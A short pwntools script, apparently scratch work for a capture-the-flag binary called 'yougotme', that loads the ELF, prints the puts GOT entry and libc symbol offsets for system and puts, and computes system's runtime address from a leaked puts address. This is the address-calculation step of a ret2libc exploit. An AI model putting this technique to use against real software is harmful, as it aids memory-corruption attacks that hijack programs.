#!/usr/bin/env python3
from pwn import *

elf = ELF("./yougotme")

p = elf.process()

print(elf.got['puts'])
# 6295320
print(elf.libc.symbols['system'])
# 324640
print(elf.libc.symbols['puts'])
# 526704

# offset: -202064

# read: 6295320
# 0x7f2358bfa970

# 0x7f2358bfa970 + offset
139789789336608